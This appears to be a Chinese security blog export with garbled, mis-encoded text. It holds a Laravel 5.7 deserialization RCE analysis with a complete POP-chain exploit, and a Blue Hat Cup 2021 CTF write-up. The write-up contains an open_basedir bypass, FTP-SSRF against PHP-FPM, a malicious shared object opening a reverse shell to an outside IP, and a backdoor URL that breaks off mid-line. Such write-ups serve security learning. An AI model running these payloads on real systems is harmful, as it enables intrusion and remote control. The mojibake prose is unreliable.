key:generateå³å¯ã€‚è®¿é—®å‡ºç°æ²¡æœ‰errorå°±æ˜¯æ­å»ºæˆåŠŸï¼š â€”â€”â€”â€”â€”â€”â€”â€”åè®°ï¼šæ”¹hostsé‚£ä¸€æ­¥å¯èƒ½ä¸æ˜¯å¿…é¡»çš„ã€‚ å¦‚ä½•åˆ©ç”¨phpStormè¿›è¡ŒåŠ¨æ€è°ƒè¯•è¿™ä¸€æ­¥æ˜¯åé¢è¦ç”¨çš„ï¼Œåœ¨è¿›è¡Œä»£ç å®¡è®¡æ—¶ï¼Œé€šè¿‡è°ƒè¯•è¿›è¡Œåˆ†ææ˜¯éå¸¸é‡è¦çš„ï¼Œæ‰€ä»¥è™½ç„¶æœ‰äº›å°éº»çƒ¦ï¼Œä½†æ˜¯å¿…é¡»ä¼šç”¨ã€‚éœ€è¦çš„ç¯å¢ƒï¼šphpStorm+Xdebug+phpStudyphpStudyè‡ªå¸¦äº†xdebugæ’ä»¶ï¼Œä½†æ˜¯é»˜è®¤æ˜¯å…³é—­çš„ï¼Œæ‰‹åŠ¨é€‰æ‹©å¼€å¯ï¼š æ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯7.3.4nts åªè¦æ”¹é€‰ä¸­çš„éƒ¨åˆ†ï¼Œåˆ«çš„é»˜è®¤å³å¯ï¼š ï¼ˆè¿™é‡Œæˆ‘ç”¨9100ç«¯å£æ˜¯å› ä¸ºæœ‰æ—¶å€™9000ä¼šè¢«å ç”¨ï¼Œä¸ºäº†é¿å…åé¢å†²çªçš„éº»çƒ¦æ¢æˆäº†å’Œç½‘ä¸Šæ•™ç¨‹éƒ½ä¸ä¸€æ ·çš„9100ï¼‰ æ¥ä¸‹æ¥ æµè§ˆå™¨ä¸Šä¸‹è½½Xdebug helper åœ¨urlæ åé¢çš„å°è™«ã€‚ ç„¶åå°±æ˜¯é…ç½®phpStorm ä¸‹æ–­ç‚¹ æµè§ˆå™¨åˆ·æ–°ï¼š çº¢ç‚¹ä¸­æ‰“å‹¾å°±è¯´æ˜å·²ç»æˆåŠŸæ–­ä¸‹æ¥äº†ã€‚ Laravel 5.7.x ååºåˆ—åŒ–æ¼æ´åˆ†ælaravel 5.7æ˜¯ä¸€æ¬¾åŸºäºphp 7.1.3ä¹‹ä¸Šè¿è¡Œçš„ä¼˜ç§€phpå¼€å‘æ¡†æ¶,ååºåˆ—åŒ–RCEæ¼æ´å‡ºç°åœ¨æ ¸å¿ƒåŒ…ä¸­ï¼Œä½†æ˜¯éœ€è¦å¯¹åŸºäºlaravel v5.7æ¡†æ¶è¿›è¡ŒäºŒæ¬¡å¼€å‘çš„cmså‡ºç°å¯æ§ååºåˆ—åŒ–ç‚¹ï¼Œæ‰èƒ½è§¦å‘æ¼æ´å®ç°RCEã€‚ ç”±äºåœ¨æœ¬åœ°æ­å»ºçš„ä»…ä»…æ˜¯Laravelä¸€ä¸ªç©ºæ¶å­ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ã€‚åœ¨routes\\web.phpå¢åŠ ä¸€ä¸ªè·¯ç”±: Route::get(&#39;/index&#39;,&#39;TaskController@index&#39;); æ–°å»ºapp\\Http\\Controllers\\TaskController.phpï¼Œå¹¶ä¸”åœ¨æ­¤å¢åŠ ååºåˆ—åŒ–å…¥å£ï¼š &lt;?php namespace App\\Http\\Controllers; class TaskController { public function index(){ if(isset($_GET[&#39;ser&#39;])){ $ser = $_GET[&#39;ser&#39;]; unserialize($ser); return ; }else{ echo &quot;no unserialization&quot;; return ; } } } ?&gt; å°†Laravel 5.6å’Œ5.7ç‰ˆæœ¬è¿›è¡Œå¯¹æ¯”ï¼Œåœ¨vendor\\laravel\\framework\\src\\Illuminate\\Foundation\\Testing\\ä¸‹æ–°ç‰ˆæœ¬å¤šå‡ºäº†ä¸€ä¸ªæ–‡ä»¶PendingCommand.phpï¼špublic$test;//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\\Auth\\GenericUserprotected$app;//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\\Foundation\\Applicationprotected$command;//è¦æ‰§è¡Œçš„phpå‡½æ•° systemprotected$parameters;//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•° array(â€˜idâ€™) PendingCommand.phpä¸­runå‡½æ•°ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œdestructä¸­åˆè°ƒç”¨äº†runå‡½æ•°ã€‚æ‰€ä»¥ç®€å•çš„ POP é“¾ä¸ºï¼šæ„é€ çš„ exp ç»è¿‡ååºåˆ—åŒ–åè°ƒç”¨ __destruct()ï¼Œè¿›è€Œè°ƒç”¨ run(),run() è¿›è¡Œä»£ç æ‰§è¡Œã€‚ ç°åœ¨é€šè¿‡expæ¥åŠ¨æ€è°ƒè¯•å¯¹åˆ©ç”¨é“¾è¿›è¡Œåˆ†æ:åœ¨æ‰§è¡Œunserializeåéœ€è¦åŠ è½½ç±»ï¼Œè¿™é‡Œæ˜¯é€šè¿‡src\\Illuminate\\Foundation\\AliasLoader.phpä¸­loadæ–¹æ³•è¿›è¡Œç±»çš„åŠ è½½ï¼š æ¡¥è±†éº»è¢‹ï¼Œåœ¨è¿™ä¸€æ­¥ä¹‹å‰éœ€è¦ä¼šç”¨phpStormè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œæ•™ç¨‹åœ¨ä¸Šé¢ã€‚ è·Ÿè¿›unserializeï¼š static::$facadeNamespaceæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ï¼šFacades\\æ¥çœ‹ä¸‹è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼šFacadesï¼ˆè¯»éŸ³ï¼š/fÉ™ËˆsÃ¤d/ ï¼‰ä¸ºåº”ç”¨ç¨‹åºçš„æœåŠ¡å®¹å™¨ä¸­å¯ç”¨çš„ç±»æä¾›äº†ä¸€ä¸ªã€Œé™æ€ã€æ¥å£ã€‚Laravel è‡ªå¸¦äº†å¾ˆå¤š facades ï¼Œå‡ ä¹å¯ä»¥ç”¨æ¥è®¿é—®åˆ° Laravel ä¸­æ‰€æœ‰çš„æœåŠ¡ã€‚Laravel facades å®é™…ä¸Šæ˜¯æœåŠ¡å®¹å™¨ä¸­é‚£äº›åº•å±‚ç±»çš„ã€Œé™æ€ä»£ç†ã€ï¼Œç›¸æ¯”äºä¼ ç»Ÿçš„é™æ€æ–¹æ³•ï¼Œ facades åœ¨æä¾›äº†ç®€æ´ä¸”ä¸°å¯Œçš„è¯­æ³•åŒæ—¶ï¼Œè¿˜å¸¦æ¥äº†æ›´å¥½çš„å¯æµ‹è¯•æ€§å’Œæ‰©å±•æ€§ã€‚Laravel æ¡†æ¶é—¨é¢ Facade æºç åˆ†æï¼šhttps://learnku.com/articles/4684/analysis-of-facade-source-code-of-laravel-frame æ¦‚æ‹¬ä¸€ä¸‹ï¼šé—¨é¢ç›¸å¯¹äºå…¶ä»–æ–¹æ³•æ¥è¯´ï¼Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ç®€æ´ã€‚ å› æ­¤æ€»ç»“ä¸€ä¸‹ï¼Œæ­¤æ—¶åŠ è½½ArrayInputç±»å’ŒMockeryç±»å°±ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š 1.éœ€è¦åŠ è½½çš„ç±»æ˜¯å¦ä¸ºfacedeé—¨é¢ç±»ï¼Œå¦‚æœæ˜¯åˆ™è°ƒç”¨$this-&gt;loadFacade2.Illuminate\\Support\\Facadeså‘½åç©ºé—´æ¥æŸ¥æ‰¾æ˜¯å¦å±äºè¿™äº›alias aliasæ˜¯ç±»çš„åˆ«åï¼Œclass_aliaså‡½æ•°å¯ä»¥ä¸ºä»»ä½•ç±»åˆ›å»ºåˆ«åï¼Œè€Œåœ¨Laravelå¯åŠ¨åä¸ºå„ä¸ªé—¨é¢ç±»è°ƒç”¨äº†class_aliaså‡½æ•°ï¼Œå› æ­¤ä¸å¿…ç›´æ¥ç”¨ç±»åï¼Œåœ¨configæ–‡ä»¶å¤¹çš„appæ–‡ä»¶é‡Œé¢å­˜æ”¾ç€é—¨é¢ä¸ç±»åçš„æ˜ å°„.Mockeryç±»å¹¶éé—¨é¢ç±»ï¼Œå› æ­¤è¿›å…¥åé¢çš„ifåé€šè¿‡loadClassæ–¹æ³•è°ƒç”¨findfile()å‡½æ•°é€šè¿‡classMapä¸­å®šä¹‰çš„å‘½åç©ºé—´å’Œå¯¹åº”ç±»çš„åœ°å€çš„æ˜ å°„æ¥è·å¾—æ‰€è¦åŠ è½½ç±»å¯¹åº”çš„ç±»æ–‡ä»¶åœ°å€ï¼Œæ‰¾åˆ°ç±»åœ°å€åé€šè¿‡includeFileæ¥å°†è¯¥ç±»è¿›è¡ŒåŒ…å«ï¼š åˆ°è¿™LaravelåŠ è½½ç±»çš„æ–¹å¼åº”è¯¥ä¹Ÿæ¯”è¾ƒæ¸…æ¥šäº†ï¼Œåˆ°æ­¤å®Œæˆäº†å¯¹æ•´ä¸ªåˆ©ç”¨ç±»ï¼Œä¹Ÿå°±æ˜¯PendingCommandç±»çš„åŠ è½½å·²ç»å®Œæˆã€‚ ä¸‹é¢è¿›å…¥è¯¥ç±»çš„ææ„æ–¹æ³•ï¼š è¿™é‡ŒhasExecutedé»˜è®¤ä¸ºfalseï¼Œå›¾ç‰‡å¤ªé•¿äº†æ²¡æˆªåˆ°ã€‚ç„¶åè¿›å…¥$this-&gt;runæ–¹æ³•ï¼š ä½¿ç”¨Mockery::mockå®ç°å¯¹è±¡çš„æ¨¡æ‹Ÿï¼š è¿™é‡Œæ¶‰åŠåˆ°ç±»çš„åŠ è½½ï¼Œå› æ­¤å†æ¬¡ä¼šè°ƒç”¨loadæ–¹æ³•æ¥åŠ è½½ç±»,å›åˆ°loadé‚£é‡Œé‡å¤ä¸€éï¼Œè¿™é‡Œå°±ç›´æ¥è·³è¿‡äº†ã€‚æ¥ç€ä¼šè°ƒç”¨$this-&gt;createABufferedOutputMock()æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³•ï¼š å¾ˆæ˜æ˜¾å¦‚æœè¿™é‡ŒexpectedOutputä¸æ˜¯æ•°ç»„çš„è¯å°±ä¼šç«‹åˆ»æŠ¥é”™ï¼Œåˆ©ç”¨é“¾æ— æ³•ç»§ç»­ã€‚æ‰€ä»¥å…¨å±€æ‰¾ä¸€ä¸‹è¿™ä¸ªå±æ€§çœ‹çœ‹æœ‰æ²¡æœ‰å¯æ§çš„åœ°æ–¹ï¼š å‘ç°åªæœ‰æµ‹è¯•ç±»æœ‰è¯¥å±æ€§ã€‚è€Œæµ‹è¯•ç±»ä¸€èˆ¬ä¸ä¼šåŠ è½½ï¼Œé‚£æœ‰ä½•åŠæ³•èƒ½å¤Ÿå‡­ç©ºåˆ›é€ expectedOutputå±æ€§å‘¢ï¼Ÿ é­”æœ¯æ–¹æ³•ã€‚å½“ç±»çš„æˆå‘˜å±æ€§è¢«è®¾å®šä¸ºprivateç”šè‡³æ˜¯æ²¡æœ‰è¯¥æˆå‘˜å±æ€§æ—¶å¦‚æœæˆ‘ä»¬å»è·å–è¿™ä¸ªä¸å­˜åœ¨æˆ–è€…æ˜¯ç§æœ‰å±æ€§ï¼Œåˆ™ä¼šè§¦å‘è¯¥ç±»çš„__get()é­”æœ¯æ–¹æ³•ã€‚ èƒ½æœå‡ºæ¥ä¸€å †ï¼Œè¿™é‡Œå’Œç½‘ä¸Šæ–‡ç« ä¸€æ ·é€‰æ‹©//vendor\\laravel\\framework\\src\\Illuminate\\Auth\\GenericUser.phpè¿™é‡Œçš„ã€‚ class GenericUser implements UserContract { public function __construct(array $attributes) { $this-&gt;attributes = $attributes; } public function __get($key) { return $this-&gt;attributes[$key]; } } åªéœ€è¦ä½¿å¾—$this-&gt;testä¸ºGenericUserç±»ï¼Œå¹¶ä¸”è®©attributesä¸­å­˜åœ¨é”®åä¸ºexpectedOutputçš„æ•°ç»„ï¼Œè¿™æ ·ä¾¿å¯ä»¥è·³å‡ºå¾ªç¯ï¼Œä½¿å¾—åˆ©ç”¨é“¾èƒ½å¤Ÿç»§ç»­ã€‚å›åˆ°mockConsoleOutput(): è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ•°ç»„çš„åœ°æ–¹ï¼Œæ–¹æ³•åŒä¸Šã€‚ æ¥ä¸‹æ¥å°±åˆ°äº†åˆ©ç”¨é“¾çš„å…³é”®å¤„ï¼š try { $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); } catch (NoMatchingExpectationException $e) { if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) { $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;); } throw $e; } æ¥çœ‹åé¢çš„è°ƒç”¨æ ˆï¼šè¿™é‡Œæˆ‘æ²¡æ–­åˆ°åé¢çš„è°ƒç”¨æ ˆï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œå·å›¾ï¼š â€”â€”â€”â€”åè®°ï¼šè¿™é‡Œå¯èƒ½æ˜¯è¦è¾¹è°ƒè¾¹æ˜¾ç¤ºçš„ï¼Œè°ƒåˆ°åé¢å°±å‡ºæ¥äº†ã€‚ Kernel::classæ˜¯ä¸€ä¸ªå®šé‡ï¼Œå…¶å€¼ä¸ºIlluminate\\Contracts\\Console\\Kernelè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬æŒç»­è·Ÿè¿›åå‡ ä¸ªè°ƒç”¨æ ˆï¼š åœ¨è¿›å…¥make()æ–¹æ³•,å› ä¸ºåªæœ‰ä¸€ä¸ª$keyå‚æ•°ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç©ºå€¼ å†è°ƒç”¨çˆ¶ç±»çš„makeæ–¹æ³•ï¼Œæ­¤æ—¶parametersä¸ºç©ºï¼š è·Ÿè¿›ä¸‹é¢è¿™ä¸ªresolveæ–¹æ³•ï¼š /** * Resolve the given type from the container. * * @param string $abstract * @param array $parameters * @return mixed */ protected function resolve($abstract, $parameters = []) { $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null( $this-&gt;getContextualConcrete($abstract) ); // If an instance of the type is currently being managed as a singleton we&#39;ll // just return an existing instance instead of instantiating new instances // so the developer can keep using the same objects instance every time. if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) { return $this-&gt;instances[$abstract]; } $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); // We&#39;re ready to instantiate an instance of the concrete type registered for // the binding. This will instantiate the types, as well as resolve any of // its &quot;nested&quot; dependencies recursively until all have gotten resolved. if ($this-&gt;isBuildable($concrete, $abstract)) { $object = $this-&gt;build($concrete); } else { $object = $this-&gt;make($concrete); } // If we defined any extenders for this type, we&#39;ll need to spin through them // and apply them to the object being built. This allows for the extension // of services, such as changing configuration or decorating the object. foreach ($this-&gt;getExtenders($abstract) as $extender) { $object = $extender($object, $this); } // If the requested type is registered as a singleton we&#39;ll want to cache off // the instances in &quot;memory&quot; so we can return it later without creating an // entirely new instance of an object on each subsequent request for it. if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) { $this-&gt;instances[$abstract] = $object; } $this-&gt;fireResolvingCallbacks($abstract, $object); // Before returning, we will also set the resolved flag to &quot;true&quot; and pop off // the parameter overrides for this build. After those two things are done // we will be ready to return back the fully constructed class instance. $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object; } ç¬¬ä¸€ç§æ€è·¯ï¼š æˆ‘ä»¬çœ‹åˆ°resolveæ–¹æ³•ä¸­: // namespace Illuminate\\Container if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) { return $this-&gt;instances[$abstract]; } å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶$this-&gt;instancesï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æœ‰å¯èƒ½è¿”å›ä¸€ä¸ªä»»æ„å¯¹è±¡ï¼Œæœ€ç»ˆè¯¥å¯¹è±¡ä¼šèµ‹å€¼ç»™$this-&gt;app[Kernel::class]ï¼Œåœ¨è¿™é‡Œé€‰å–çš„æ˜¯\\Illuminate\\Foundation\\Applicationï¼Œè¯¥ç±»åŒæ ·ç»§æ‰¿è‡ªContainers,å› æ­¤åŒæ ·ä¼šè¿›å…¥è¯¥æ–¹æ³•ï¼Œæ­¤æ—¶$thiså°±æ˜¯Applicationè¿™ä¸ªå®ä¾‹ï¼Œè€Œæˆ‘ä»¬æƒ³è¦è¿”å›çš„åŒæ ·ä¹Ÿæ˜¯è¯¥ç±»ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åšçš„æ˜¯ Application-&gt;instances[â€˜Illuminate\\Contracts\\Console\\Kernelâ€™] = Application è‡³äºä¸ºä½•é€‰å–Applicationåœ¨ä¹‹ååˆ†æè¿‡ç¨‹ä¸­ä¹Ÿå°±æ˜äº†äº†ï¼š åˆ†æåˆ°è¿™æˆ‘ä»¬å¯ä»¥å…ˆæ„é€ éƒ¨åˆ†EXP: &lt;?php namespace Illuminate\\Foundation\\Testing{ //æ‰§è¡Œå‡½æ•°æ‰€åœ¨å¤„ use PHPUnit\\Framework\\TestCase as PHPUnitTestCase; class PendingCommand{ protected $app; protected $command; protected $parameters; public $test; public function __construct($test, $app, $command, $parameters) { $this-&gt;app = $app; $this-&gt;test = $test; $this-&gt;command = $command; $this-&gt;parameters = $parameters; } } } namespace Illuminate\\Auth{ //æ­¤å¤„å’Œä¸‹é¢ä¸€æ ·éƒ½æ˜¯è§¦å‘getçš„ï¼ŒäºŒé€‰ä¸€å³å¯ class GenericUser{ protected $attributes; public function __construct(array $attributes) { $this-&gt;attributes = $attributes; } public function __get($key) { return $this-&gt;attributes[$key]; } } } //__getæ–¹æ³•ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç±» namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default; } public function __get($attribute) { return $this-&gt;default; } } } namespace Illuminate\\Foundation{ class Application{ protected $instances = []; public function __construct($instances = []) { $this-&gt;instances[&#39;Illuminate\\Contracts\\Console\\Kernel&#39;] = $instances; } } } namespace { $genericuser = new Illuminate\\Auth\\GenericUser( array( //è¿™é‡Œéœ€è¦ä¸¤æ¬¡ä½¿ç”¨æ¥å¾ªç¯è·å¾—ä»¥ä¾¿æˆåŠŸè·³è¿‡æ–¹æ³•,ä¸¤æ¬¡é”®ååˆ†åˆ«ä¸ºexpectedOutputå’ŒexpectedQuestions &quot;expectedOutput&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;0&quot;), &quot;expectedQuestions&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;1&quot;) ) ); $app = new Illuminate\\Foundation\\Application(); //é€šè¿‡å¦‚ä¸‹æ­¥éª¤æœ€ç»ˆè·å¾—çš„$this-&gt;app[Kernel::class]å°±æ˜¯è¯¥Applicationå®ä¾‹ $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand( $genericuser, $application, &quot;system&quot;, array(&quot;whoami&quot;) ); echo urlencode(serialize($pendingcommand)); } é€‰æ‹©applicationç±»çš„ç†ç”±ï¼šæ­¤æ—¶çš„$thiså’Œinstanceså‡ä¸ºapplicationç±»ï¼Œæ­¤æ—¶èµ‹å€¼ç»™$this-&gt;app[Kernel::class]ï¼Œåœ¨ç»§ç»­è°ƒç”¨callæ–¹æ³•æ—¶ï¼Œç”±äºapplicationç±»æ²¡æœ‰callæ–¹æ³•ï¼Œæ ¹æ®ç‰¹æ€§ä¼šå¯»æ‰¾å…¶çˆ¶ç±»ä¹Ÿå°±æ˜¯Containerç±»çš„callæ–¹æ³•: æ­¤æ—¶$callbackä¸ºsystemè€Œ$parametersä¸ºwhoamiï¼Œç»§ç»­è·Ÿè¿›ï¼šã€ public static function call($container, $callback, array $parameters = [], $defaultMethod = null) { if (static::isCallableWithAtSign($callback) || $defaultMethod) { return static::callClass($container, $callback, $parameters, $defaultMethod); } return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) { return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); }); } æ­¤æ—¶$callback = system,åˆ¤æ–­æ˜¯å¦è¿›å…¥isCallableWithAtSign: æ˜¾ç„¶æ— æ³•æ»¡è¶³ï¼Œè¿›å…¥ç¬¬äºŒä¸ªåˆ†æ”¯ï¼š å¯ä»¥çœ‹åˆ°getMethodDependenciesæ–¹æ³•åªæ˜¯å°†ä¸€ä¸ªç©ºæ•°ç»„å’Œ$parametersè¿›è¡Œåˆå¹¶ï¼Œåˆå¹¶åçš„æ•°æ®ä¾ç„¶æ˜¯å¯æ§çš„ï¼Œæœ€ç»ˆé€šè¿‡call_user_func_array(â€˜systemâ€™,array(â€˜whoamiâ€™))æ‰§è¡Œå‘½ä»¤ï¼Œè¿™ä¹Ÿæ˜¯$parametersä¸ºæ•°ç»„çš„åŸå› ï¼Œå› ä¸ºcall_user_func_arrayç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯æ•°ç»„å½¢å¼ã€‚ ç¬¬äºŒç§æ€è·¯ï¼š æ²¡æœ‰è¿›å…¥è¯¥ifè¯­å¥ï¼Œç»§ç»­å¾€ä¸‹è¿è¡Œä¼šè¿›å…¥getConcrete()æ–¹æ³•ï¼Œè€Œå…¶ä¸­çš„å…³é”®æ–¹æ³•å°±æ˜¯getConcrete()ï¼Œæˆ‘ä»¬åœ¨ç»§ç»­è·Ÿè¿›: çœ‹äº†åé¢æ€è·¯ä¸æ–¹æ³•ä¸€å¤§è‡´ç›¸åŒ å°±ä¸å†™äº†ã€‚ å¤ç°æ€è·¯ï¼šhttps://www.anquanke.com/post/id/230005æ€»ç»“ï¼šè™½ç„¶è¿˜æ˜¯ä¸èƒ½å®Œå…¨çœ‹æ‡‚ï¼Œä½†æ˜¯å¯¹Laravelæ¡†æ¶å’Œæ­¤ååºåˆ—åŒ–rceçš„æ‰§è¡Œæµç¨‹æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼Œä»¥åç†Ÿç»ƒäº†å¿…é¡»å†å›æ¥è‡ªå·±ç†ä¸€éã€‚ Laravel5.4 ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ 2021/5/10éº»äº†ï¼Œå†™äº†ä¸€å †å¿˜è®°ä¿å­˜ç›´æ¥å…³æœºäº†ã€‚ã€‚ç½¢äº† åæ­£æ²¡äººçœ‹ ç•™ä¸ªè®°å½•å§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"[è“å¸½æ¯ 2021]One Pointer PHP","slug":"è“å¸½æ¯-2021-One-Pointer-PHP","date":"2021-05-06T06:46:02.000Z","updated":"2021-05-06T06:55:14.029Z","comments":true,"path":"2021/05/06/è“å¸½æ¯-2021-One-Pointer-PHP/","link":"","permalink":"/2021/05/06/è“å¸½æ¯-2021-One-Pointer-PHP/","excerpt":"","text":"è¿™é¢˜æ²¡åšå‡ºæ¥éœ€è¦åæ€ç»™äº†æºç  ç¬¬ä¸€å±‚user.php &lt;?php class User{ public $count; } ?&gt; add_api.php &lt;?php include &quot;user.php&quot;; if($user=unserialize($_COOKIE[&quot;data&quot;])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); }else{ eval($_GET[&quot;backdoor&quot;]); } }else{ $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user)); } ?&gt; å¦$a-&gt;countç­‰äºphp long longç±»å‹æœ€å¤§å€¼-1å³å¯ç»•è¿‡(è½¬åŒ–ä¸ºfloatæŠ¥é”™)æœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š æ²¡è¿‡ï¼š è¿‡äº†ï¼š è¿‡äº†ä¹‹åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹phpinfoï¼š banäº†ä¸€å¤§å †å‡½æ•°ï¼Œprint_r(scandir(./))çœ‹ä¸‹ç›®å½•ï¼š æŸ¥çœ‹æ ¹ç›®å½•å¤±è´¥ï¼Œçœ‹åˆ°openbase_diræœ‰é™åˆ¶ï¼Œæƒ³èµ·æ¥[NCTF2019]phar matches everythingé‡Œä¸­bypass open_basedirçš„å§¿åŠ¿ï¼šhttps://xz.aliyun.com/t/4720 &lt;?php mkdir(&#39;troy3e&#39;); chdir(&#39;troy3e&#39;); ini_set(&#39;open_basedir&#39;,&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;); ini_set(&#39;open_basedir&#39;,&#39;/&#39;); var_dump(file_get_contents(&quot;/usr/local/etc/php/php.ini&quot;)); ?&gt; æ²¡æ³•è¯»flagï¼Œä¼°è®¡æ˜¯æƒé™ä¸å¤Ÿï¼Œä½†æ˜¯å¯ä»¥è¯»php.iniã€‚é¢„æœŸè§£æ˜¯pwnè¿™ä¸ªï¼š ç„¶åå°±ä¸ä¼šäº†ã€‚ã€‚ã€‚ä¸è¿‡ç°åœ¨æƒ³æƒ³è¿˜æ˜¯å¤§æ„äº†ï¼Œå› ä¸ºè¿™éé¢„æœŸå‰é˜µå­åˆšå­¦ä¹ è¿‡ï¼Œè¿˜å°±æ˜¯ä¸Šé¢NCTFé‚£é“é¢˜é‡Œé¢çš„ã€‚ã€‚ã€‚æ­¤å¤„ä¸å¾—ä¸ä½©æœha1å¸ˆå‚…ï¼šhttps://ha1c9on.top/2021/04/29/lmb_one_pointer_php/ å›åˆ°phpinfo æŸ¥çœ‹nginxé…ç½®æ–‡ä»¶ï¼šreadfile(â€˜/etc/nginx/sites-enabled/defaultâ€™); å‘ç°fpmå¼€åœ¨9001ç«¯å£ã€‚ FTP - SSRF æ”»å‡» FPM/FastCGIå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–æ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥?file=ftp://evil-server/file.txt&amp;data=payloadï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š é¦–å…ˆé€šè¿‡ file_put_contents() å‡½æ•°è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶è¯•å›¾ä½¿ç”¨ file_put_contents() æŠŠæ–‡ä»¶ä¸Šä¼ ä¸Šå»ã€‚ä½†æ˜¯æˆ‘ä»¬æ­å»ºçš„æ¶æ„çš„ftpæœåŠ¡å™¨å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ° 127.0.0.1:9000ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºæœ¬åœ°çš„ PHP-FPM å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRFäº†ã€‚ è¿™é‡Œé€šè¿‡åŠ è½½æ¶æ„soçš„æ–¹å¼æ¥RCEã€‚ å†™ä¸€ä¸ªæ‰©å±•ï¼š #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; __attribute__ ((__constructor__)) void preload (void){ system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/121.x.x.x/3333 0&gt;&amp;1&#39;&quot;); } ç¼–è¯‘ï¼š gcc hpdoger.c -fPIC -shared -o hpdoger.so å°†ç”Ÿæˆçš„ hpdoger.so ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºçš„ /tmp ç›®å½•ä¸­ï¼Œä¹‹å‰å¤ç°å°±å¡åœ¨è¿™ä¸€æ­¥ï¼Œç›´æ¥ç”¨çš„copyå±å®æ˜¯hanpiäº†(å‚è€ƒhttp://www.hackdig.com/05/hack-342091.htm)ï¼š /add_api.php?backdoor=mkdir(&#39;troy3e&#39;);chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);copy(&#39;http://121.196.169.53:5554/hpdoger.so) 